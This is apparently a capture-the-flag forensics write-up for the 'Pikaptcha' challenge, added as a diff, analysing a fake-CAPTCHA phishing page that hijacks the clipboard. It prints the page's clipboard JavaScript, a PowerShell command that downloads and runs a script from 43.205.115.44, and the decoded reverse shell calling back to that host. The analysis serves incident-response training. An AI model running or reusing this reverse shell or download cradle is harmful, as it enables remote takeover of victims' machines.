@@ -1,0 +1,119 @@
+Pikaptcha Sherlock:
+
+
+Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.
+
+Given artifacts:
+Pikaptcha.pcapng
+2024-09-23T05_22_09_5720380_CopyLog.csv
+2024-09-23T05_22_09_5720380_SkipLog.csv.csv
+C: drive folder which contains .dat files
+
+Tools needed:
+regipy-dump ~/Downloads/Pikaptcha/2024-09-23T052209_alert_mssp_action/C/Users/happy.grunwald/NTUSER.DAT
+
+
+We found this in NTUSER.dat for user happy.grunwald
+
+"subkey_name": "RunMRU",
+    "path": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+    "timestamp": "2024-09-23T05:07:45.961848+00:00",
+    "values_count": 3,
+    "values": [
+        {
+            "name": "a",
+            "value": "%tmp%\\1",
+            "value_type": "REG_SZ",
+            "is_corrupted": false
+        },
+        {
+            "name": "MRUList",
+            "value": "ba",
+            "value_type": "REG_SZ",
+            "is_corrupted": false
+        },
+        {
+            "name": "b",
+            "value": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')\"\\1",
+            "value_type": "REG_SZ",
+            "is_corrupted": false
+        }
+
+
+Now go to wireshark:
+Go to statistics - > Endpoints 
+
+Sort by bytes and we can see which IP is giving us the most traffic:
+
+
+Now go to file - > export -> HTTP 
+
+Filter for the IP that initiated the response from the powershell we found, go ahead and save it to directory for further analysis
+
+
+
+Now go back:
+ip.addr==43.205.115.44 and http 
+ and find the HTTP get request for the file above
+
+
+
+
+Office2024install.ps1 is a malicious script that forces a reverse shell back to "43.205.115.44",6969
+
+Read the contents by:
+┌──(kali㉿kali)-[~]
+└─$ cat office2024install.ps1 | cut -d' ' -f3 | base64 -d | tr ';' '\n'
+$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+$sendback = (iex $data 2>&1 | Out-String )
+$sendback2 = $sendback + "PS " + (pwd).Path + "> "
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+$stream.Write($sendbyte,0,$sendbyte.Length)
+$stream.Flush()}
+$client.Close()       
+
+
+ip.addr==43.205.115.44 and tcp.port==6969 to see how long the communication was for
+
+
+Here’s the HTTP stream which showed the source code:
+function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id){
+	    const revershell=`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
+            const suffix = " # "
+            const ploy = "... ''I am not a robot - reCAPTCHA Verification ID: "
+            const end = "''"
+            const textToCopy = revershell
+
+            setClipboardCopyData(textToCopy);
+        }
+
+
+Incident:
+
+The user, Happy Grunwald, visited a malicious website under the guise of downloading an update for Microsoft Office.
+
+The website included a fake CAPTCHA mechanism, but instead of verifying the user, it exploited browser capabilities to copy a malicious PowerShell command onto the clipboard.
+
+The JavaScript on the website used the document.execCommand("copy") function to overwrite the user's clipboard with the PowerShell reverse shell command. The intention is to force the user to copy and paste which forces the execution of the copied clipboard command onto the computer.
+
+Once executed the copied command, It fetched office2024install.ps1 from 43.205.115.44 and executed it in memory using IEX (Invoke-Expression). This would make detection harder by typical scanners reading from the system, as the malicious payload went straight to memory without leaving artifacts.
+
+The downloaded script established a reverse shell connection back to the attacker at 43.205.115.44:6969.
+
+Root Cause:
+
+The combination of clipboard manipulation and user behavior (likely pasting the copied text into a terminal) facilitated the attack.
+
